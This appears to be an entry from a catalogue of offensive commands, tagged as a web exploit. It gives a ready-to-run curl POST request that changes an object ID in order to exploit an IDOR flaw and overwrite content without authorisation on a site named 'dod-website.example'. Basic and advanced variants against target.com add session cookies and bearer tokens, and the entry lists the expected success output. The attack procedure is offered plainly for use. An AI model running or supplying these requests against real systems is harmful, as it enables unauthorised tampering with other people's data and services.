---
data: >-
  curl -X POST 'https://dod-website.example/content/update' -H 'Content-Type:
  application/x-www-form-urlencoded' -d 'id=456&field=malicious_value' -b
  'session=valid_session_cookie'
tags:
  - web
  - exploit
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.513Z'
id: c4e884ea-ca2f-44de-8931-83600985c083
verified: false
validated: true
submitted: true
---
# curl-modify-parameter

## Command

```bash
curl -X POST 'https://dod-website.example/content/update' -H 'Content-Type: application/x-www-form-urlencoded' -d 'id=456&field=malicious_value' -b 'session=valid_session_cookie'
```

## Description

This curl command sends a POST request to modify a web resource by altering the object ID parameter, exploiting IDOR to update unauthorized content.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for update | Yes |
| `-H` | Headers like Content-Type | Yes |
| `-d` | Form data with modified ID | Yes |
| `-b` | Cookie for session | Yes if authenticated |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/update' -d 'id=456&title=New Title'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/update' -H 'Authorization: Bearer token' -d 'id=456&content=Malicious' -b 'session=abc'
```

## Expected Output

HTTP 200 OK with success message, e.g., {"status":"updated"}. Verify changes via GET request.

## Related

- [[Related Procedure: Exploit-IDOR-for-Unauthorized-Modification]]
